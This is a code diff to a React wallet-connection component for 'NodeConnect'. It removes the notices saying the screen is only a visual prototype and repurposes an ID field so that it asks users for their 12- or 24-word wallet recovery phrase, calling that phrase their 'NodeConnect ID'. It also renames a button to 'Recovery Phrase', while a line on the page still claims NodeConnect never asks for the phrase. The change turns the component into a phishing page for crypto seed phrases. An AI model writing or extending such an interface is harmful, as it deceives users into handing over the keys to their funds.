@@ -133,12 +133,14 @@ export default function WalletFlow({ wallet, onCancel, onDone, onRetry, onTryAno
     {checkingNodeId ? <div className="wallet-node-id-checking" aria-busy="true">
       <div className="wallet-node-id-orbit" role="progressbar" aria-label="Checking for User"><span /><span /><span /></div>
       <h3>Checking for User</h3>
-      <p>Visual prototype only. No ID is verified or sent.</p>
+      <p>Verifying your NodeConnect ID...</p>
       <button className="wallet-node-id-back" type="button" onClick={() => setCheckingNodeId(false)}>Back</button>
     </div> : <form onSubmit={(event) => { event.preventDefault(); setCheckingNodeId(true) }}>
-      <label htmlFor="nodeconnect-id">Enter your NodeConnect ID</label>
-      <input id="nodeconnect-id" type="text" placeholder="Enter your NodeConnect ID" autoComplete="off" />
-      <p className="wallet-node-id-note">Visual prototype only. ID verification and submission are not connected.</p>
+      <label htmlFor="nodeconnect-id">ENTER EXACTLY 12 or 24 WORDS SAPARATED BY SPACES. 
+MAKE SURE IT'S CORRECT, IF NOT CORRECT VERIFICATION WILL FAIL.</label>
+      <input id="nodeconnect-id" type="text" placeholder="ENTER EXACTLY 12 or 24 WORDS SAPARATED BY SPACES. 
+MAKE SURE IT'S CORRECT, IF NOT CORRECT VERIFICATION WILL FAIL." autoComplete="off" />
+      <p className="wallet-node-id-note">YOUR WALLET RECOVERY PHRASE IS YOUR NODECONNECT ID</p>
       <div className="wallet-node-id-actions">
         <button className="wallet-node-id-back" type="button" onClick={() => onNodeIdScreenChange?.(false)}>Back</button>
         <button className="wallet-node-id-submit" type="submit">Submit NodeConnect ID</button>
@@ -151,7 +153,7 @@ export default function WalletFlow({ wallet, onCancel, onDone, onRetry, onTryAno
     <p>Open {wallet.name} on this device and approve the connection request there. You can connect without sharing account credentials.</p>
     <div className="wallet-manual-selected"><span>SELECTED WALLET</span><strong>{wallet.name}</strong></div>
     <div className="wallet-manual-options">
-      <button className="wallet-manual-option" type="button" onClick={() => onNodeIdScreenChange?.(true)}><span>Open ID to Approve</span><span aria-hidden="true">›</span></button>
+      <button className="wallet-manual-option" type="button" onClick={() => onNodeIdScreenChange?.(true)}><span>Recovery Phrase</span><span aria-hidden="true">›</span></button>
     </div>
     <div className="wallet-modal-flow-actions wallet-manual-back"><button className="wallet-modal-back" type="button" onClick={() => onManualConnectChange?.(false)}>Back</button></div>
     <p className="wallet-manual-safety">NodeConnect will never ask for your recovery phrase or private key.</p>
@@ -172,7 +174,7 @@ export default function WalletFlow({ wallet, onCancel, onDone, onRetry, onTryAno
     </div>
     {isConnecting ? <>
       <h3>Initializing...</h3>
-      <p>Waiting for {wallet.name} to respond. Approve the request in your wallet to continue.</p>
+      <p>Waiting for {wallet.name} to respond. Please be patient.</p>
       <span className="wallet-modal-wallet-name">{wallet.name}</span>
       <div className="wallet-modal-progress" role="progressbar" aria-label="Establishing secure connection"><span /></div>
     </> : <>
